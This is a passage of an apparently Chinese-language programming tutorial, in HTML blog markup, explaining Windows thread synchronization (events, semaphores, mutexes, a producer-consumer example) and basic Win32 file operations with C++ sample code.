class="line">WaitForSingleObject(g_hEvent, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;下班了，开始吃饭吧&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line">g_hEvent = g_hEvent = CreateEvent(</span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">//安全属性</span></span><br><span class="line">FALSE,<span class="comment">//TRUE:手工重置   FALSE:自动重置</span></span><br><span class="line">FALSE, <span class="comment">//TRUE:初始为激发态，  FALSE:初始就是非激发态</span></span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">hThread1 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, WifeProc, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, HusProc, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">WaitForSingleObject(hThread1, <span class="number">-1</span>);</span><br><span class="line">WaitForSingleObject(hThread2, <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="信号量："><a href="#信号量：" class="headerlink" title="信号量："></a>信号量：</h4><p>​      有信号数这么一个概念，只要信号数不为0，那么就处于激发态。WaitForSignaleObject函数对它的副作用是将信号数减1。</p><p>​      最大信号数为1 的信号量，可以认为是一个事件，可以解决互斥问题。</p><p>​       被保护的代码（代码访问了共享资源）放置在</p><p>​      WaitForSignalObject</p><p>​       ReleaseSemaphore</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HANDLE CreateSemaphore(</span><br><span class="line">  LPSECURITY_ATTRIBUTES lpSemaphoreAttributes,  &#x2F;&#x2F; SD</span><br><span class="line">  LONG lInitialCount,                          &#x2F;&#x2F; initial count</span><br><span class="line">  LONG lMaximumCount,                          &#x2F;&#x2F; maximum count</span><br><span class="line">  LPCTSTR lpName                           &#x2F;&#x2F; object name</span><br><span class="line">)</span><br><span class="line">此函数可用来创建或打开一个信号量，先看参数说明：</span><br><span class="line"> lpSemaphoreAttributes：为信号量的属性，一般可以设置为NULL</span><br><span class="line"> lInitialCount：信号量初始值，必须大于等于0，而且小于等于 lpMaximumCount，如果lInitialCount 的初始值为0，则该信号量默认为unsignal状态，如果lInitialCount的初始值大于0，则该信号量默认为signal状态，</span><br><span class="line"> lMaximumCount： 此值为设置信号量的最大值，必须大于0</span><br><span class="line">lpName：信号量的名字，长度不能超出MAX_PATH ，可设置为NULL，表示无名的信号量。当lpName不为空时，可创建有名的信号量，若当前信号量名与已存在的信号量的名字相同时，则该函数表示打开该信号量，这时参数lInitialCount 和 </span><br><span class="line">lMaximumCount 将被忽略。</span><br><span class="line">    函数调用成功返回信号量句柄。</span><br><span class="line">释放信号量函数：</span><br></pre></td></tr></table></figure><p>b. 对于共享资源有序的访问，也可以更关注于要有序。</p><p>​      事件和信号量更适合解决有序的问题。因为他们不要求谁上锁，谁开锁。</p><p>  用代码实现一个读文件线程，一个写文件线程，请实现先写后读，两个线程都结束之后，主线程结束。</p><p>  这种没有过多线程同时访问的有顺序的问题，比较适合用事件来解决。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> g_n = <span class="number">0</span>;</span><br><span class="line">HANDLE g_hSemaphore = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro1</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">WaitForSingleObject(g_hSemaphore, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line">ReleaseSemaphore(g_hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro2</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">WaitForSingleObject(g_hSemaphore, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line">ReleaseSemaphore(g_hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">g_hSemaphore = CreateSemaphore(</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">1</span>,</span><br><span class="line"><span class="number">1</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">hThread1 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro1, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">WaitForSingleObject(hThread1, <span class="number">-1</span>);</span><br><span class="line">WaitForSingleObject(hThread2, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g_n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多个信号数的信号量，比较适合解决多个线程之间有顺序需要协调的问题，最为经典的就是生产者消费者问题。</p><p>关键点有两个：</p><p>​    1  必须有一个队列，可以有数量限制，也可以没有数量限制。我们考虑的是有数量限制的问题</p><p>​    2  每一个生产者是一个线程，每一个消费者也是一个线程。队列满了，生产者需要等待。队列空了，消费者需要等待。</p><p>整个的问题是多线程并发时的协调问题。</p><p>生产者消费者问题，有两个操作</p><p>P：生产</p><p>V：消耗</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line">HANDLE hSemaphoreFull = <span class="number">0</span>;</span><br><span class="line">HANDLE hSemaphoreEmpty = <span class="number">0</span>;</span><br><span class="line">HANDLE hMutex = <span class="number">0</span>;</span><br><span class="line">HANDLE hMutexNum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> g_nNum = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> 盖饭</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    盖饭(<span class="keyword">const</span> <span class="keyword">char</span> *szName, <span class="keyword">int</span> nNum) :m_Id(nNum)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> nSize = <span class="built_in">strlen</span>(szName) + <span class="number">1</span>;</span><br><span class="line">        m_szName = <span class="keyword">new</span> <span class="keyword">char</span>[nSize];</span><br><span class="line">        <span class="built_in">memset</span>(m_szName, <span class="number">0</span>, nSize);</span><br><span class="line">        strcpy_s(m_szName, nSize, szName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">GetId</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_Id;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">char</span> * m_szName;</span><br><span class="line">    <span class="keyword">int</span> m_Id;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;盖饭*&gt; g_盖饭表;</span><br><span class="line"><span class="keyword">int</span> Continue = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//生产者回调函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">Creater</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpThreadParameter</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">while</span> (Continue)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> nTime = rand() % <span class="number">100</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d号生产者开始做饭,预计%dms\n&quot;</span>, (<span class="keyword">int</span>)lpThreadParameter, nTime);</span><br><span class="line">        WaitForSingleObject(hMutexNum, <span class="number">-1</span>);</span><br><span class="line">        g_nNum++;</span><br><span class="line">        盖饭* p = <span class="keyword">new</span> 盖饭(<span class="string">&quot;鱼香肉丝&quot;</span>, g_nNum);</span><br><span class="line">        ReleaseMutex(hMutexNum);</span><br><span class="line">        Sleep(nTime * <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d号生产者传菜,菜号为%d\n&quot;</span>, (<span class="keyword">int</span>)lpThreadParameter, p-&gt;GetId());</span><br><span class="line">        WaitForSingleObject(hSemaphoreEmpty, <span class="number">-1</span>);</span><br><span class="line">        WaitForSingleObject(hMutex, <span class="number">-1</span>);</span><br><span class="line">        g_盖饭表.push_back(p);</span><br><span class="line">        ReleaseMutex(hMutex);</span><br><span class="line">        ReleaseSemaphore(hSemaphoreFull, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//消费者回调函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">User</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">while</span> (Continue)</span><br><span class="line">    &#123;</span><br><span class="line">        WaitForSingleObject(hSemaphoreFull, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">int</span> nTime = rand() % <span class="number">100</span>;</span><br><span class="line">        Sleep(nTime * <span class="number">10</span>);</span><br><span class="line">        WaitForSingleObject(hMutex, <span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;                              %d号消费者取走了%d号饭,耗时%dms\n&quot;</span>, (<span class="keyword">int</span>)lpThreadParameter, g_盖饭表[<span class="number">0</span>]-&gt;GetId(), nTime);</span><br><span class="line">        g_盖饭表.erase(g_盖饭表.begin());</span><br><span class="line">        ReleaseMutex(hMutex);</span><br><span class="line">        ReleaseSemaphore(hSemaphoreEmpty, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    hSemaphoreFull = CreateSemaphore(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hSemaphoreEmpty = CreateSemaphore(<span class="literal">NULL</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hMutex = CreateMutex(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">    hMutexNum = CreateMutex(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">    HANDLE hThread[<span class="number">20</span>] = &#123;&#125;;</span><br><span class="line">    <span class="comment">//9个生产者</span></span><br><span class="line">    hThread[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">2</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">3</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">4</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">5</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">6</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">7</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">8</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">9</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//4个消费者</span></span><br><span class="line">    hThread[<span class="number">10</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, User, (LPVOID)<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">11</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, User, (LPVOID)<span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">12</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, User, (LPVOID)<span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">13</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, User, (LPVOID)<span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    WaitForMultipleObjects(<span class="number">14</span>, hThread, TRUE, <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>原子操作，只能保证对于基本算数操作是原子性的。</p><p>临界区和互斥体从词语的含义上看，他们主要就是为了解决互斥问题。</p><p>临界区的优点是快。互斥体的优点是能够跨进程访问，崩溃不死锁。</p><p>事件 从词语的含义上看，更适合做通知（产生了一个事件）。比较适合解决有先后顺序的多线程问题。</p><p>事件和互斥体的最大区别，就是线程所有权。互斥体谁上锁，谁开锁。事件没有这个要求。</p><p>信号量，由于存在信号数的问题，比较适合解决多线程的协调问题。典型问题，就是生产者消费者问题。</p><h3 id="常用函数-1"><a href="#常用函数-1" class="headerlink" title="常用函数"></a>常用函数</h3><p>原子操作：</p><table><thead><tr><th>函数</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>InterlockedIncrement</td><td>自增</td><td>InterlockedIncrement(&amp;g_count)</td></tr><tr><td>InterlockedDecrement</td><td>自减</td><td>InterlockedDecrement(&amp;g_count);</td></tr><tr><td>InterlockedExchangeAdd</td><td>加法/减法</td><td>InterlockedExchangeAdd(&amp;g_count, 256L);</td></tr><tr><td>InterlockedExchange</td><td>赋值</td><td>InterlockedExchange(&amp;g_count, 256L);</td></tr></tbody></table><p>临界区</p><table><thead><tr><th>函数</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>InitializeCriticalSection</td><td>初始化</td><td></td></tr><tr><td>DeleteCriticalSection</td><td>销毁</td><td></td></tr><tr><td>EnterCriticalSection</td><td>进入临界区</td><td></td></tr><tr><td>LeaveCriticalSection</td><td>离开临界区</td><td></td></tr></tbody></table><p>互斥体</p><table><thead><tr><th>函数</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>CreateMutex</td><td>创建互斥体</td><td>可以给互斥体起名字</td></tr><tr><td>OpenMutex</td><td>打开互斥体，得到句柄</td><td>根据名字才能打开互斥体</td></tr><tr><td>ReleaseMutex</td><td>释放互斥体</td><td>会使得互斥体处于激发态</td></tr><tr><td>CloseHandle</td><td>关闭句柄</td><td>使用完后关闭</td></tr><tr><td>WaitForSignalObject</td><td>等待互斥体处于激发态</td><td>等到激发态后，会使得互斥体再次处于非激发态</td></tr></tbody></table><p>事件</p><table><thead><tr><th>函数</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>CreateEvent</td><td>创建事件</td><td>可以给事件起名字 可以设置两种模式：手工  自动</td></tr><tr><td>OpenEvent</td><td>打开事件，得到句柄</td><td>根据名字才能打开事件</td></tr><tr><td>SetEvent</td><td>释放事件</td><td>会使得事件处于激发态</td></tr><tr><td>ResetEvent</td><td>重置事件</td><td>会使得事件处于非激发态，对手工模式的事件有效</td></tr><tr><td>WaitForSignalObject</td><td>等待事件处于激发态</td><td>等到激发态后，对于自动模式的事件会使其再次处于非激发态</td></tr></tbody></table><p>信号量</p><table><thead><tr><th>函数</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>CreateSemaphore</td><td>创建信号量</td><td>可以给信号量起名字 可以指定最大信号数和当前信号数</td></tr><tr><td>OpenSemaphore</td><td>打开信号量</td><td>根据名字才能打开信号量</td></tr><tr><td>ReleaseSemaphore</td><td>释放信号量</td><td>会增加信号量的信号数，但是不会超过最大信号数</td></tr><tr><td>WaitForSignalObject</td><td>等待信号量处于激发态</td><td>若处于激发态，则会减少1个信号数，信号数位0，将其置为非激发态</td></tr></tbody></table><h1 id="九、文件操作"><a href="#九、文件操作" class="headerlink" title="九、文件操作"></a>九、文件操作</h1><table><thead><tr><th>DeleteFile</th><th>删除文件</th></tr></thead><tbody><tr><td>CopyFile</td><td>拷贝文件</td></tr><tr><td>MoveFile</td><td>移动文件</td></tr><tr><td>CreateFile</td><td>打开文件</td></tr><tr><td>GetFileSize</td><td>获取文件大小</td></tr><tr><td>ReadFile</td><td>读取文件</td></tr><tr><td>CloseHandle</td><td>关闭文件</td></tr><tr><td>FindFirstFile</td><td>查找第一个文件</td></tr><tr><td>FindNextFile</td><td>查找下一个文件</td></tr><tr><td>WriteFile</td><td>写入数据</td></tr></tbody></table><h3 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyEnumFile</span><span class="params">(<span class="keyword">const</span> TCHAR * szPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WIN32_FIND_DATA wfd = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">HANDLE hFind =  FindFirstFile(szPath, &amp;wfd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hFind!=INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (wfd.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件夹：%S\n&quot;</span>, wfd.cFileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//MyEnumFile();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件：%S\n&quot;</span>, wfd.cFileName);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (FindNextFile(hFind, &amp;wfd));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 删除文件</span></span><br><span class="line"><span class="comment">//DeleteFile(_T(&quot;D:\\hehe\\haha.txt&quot;));</span></span><br><span class="line"><span class="comment">//2. 拷贝文件</span></span><br><span class="line"><span class="comment">//CopyFile(_T(&quot;D:\\hehe\\123\\haha.txt&quot;), _T(&quot;D:\\hehe\\123.txt&quot;),TRUE);</span></span><br><span class="line"><span class="comment">//3. 移动文件</span></span><br><span class="line"><span class="comment">//MoveFile(_T(&quot;D:\\hehe\\123\\haha.txt&quot;), _T(&quot;D:\\hehe\\nihao.txt&quot;));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//4. 打开文件 进行读写  fread   fwrite</span></span><br><span class="line">HANDLE hFile = CreateFile(</span><br><span class="line">_T(<span class="string">&quot;D:/hehe/123/haha.txt&quot;</span>),            <span class="comment">//路径</span></span><br><span class="line">GENERIC_READ | GENERIC_WRITE, <span class="comment">//打开的权限</span></span><br><span class="line"><span class="literal">NULL</span>,                         <span class="comment">//共享模式</span></span><br><span class="line"><span class="literal">NULL</span>,                         <span class="comment">//安全属性</span></span><br><span class="line">OPEN_EXISTING,                <span class="comment">//</span></span><br><span class="line">FILE_ATTRIBUTE_NORMAL,        <span class="comment">//普通属性</span></span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwRealSize = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//获取文件大小，申请相应的缓冲区空间</span></span><br><span class="line">DWORD dwSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">char</span>* pbuf = <span class="keyword">new</span> <span class="keyword">char</span>[dwSize] &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//读取文件</span></span><br><span class="line">ReadFile(hFile, pbuf, dwSize, &amp;dwRealSize, <span class="literal">NULL</span>);</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//5. 查看文件的属性</span></span><br><span class="line"><span class="comment">//5.1 基本属性</span></span><br><span class="line">DWORD dwAttribute = GetFileAttributes(_T(<span class="string">&quot;D:\\hehe\\123\\haha.txt&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (dwAttribute&amp; FILE_ATTRIBUTE_HIDDEN)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这个文件是隐藏的&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dwAttribute &amp; FILE_ATTRIBUTE_READONLY)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//printf(&quot;这个文件是只读的&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line">WIN32_FILE_ATTRIBUTE_DATA wfad = 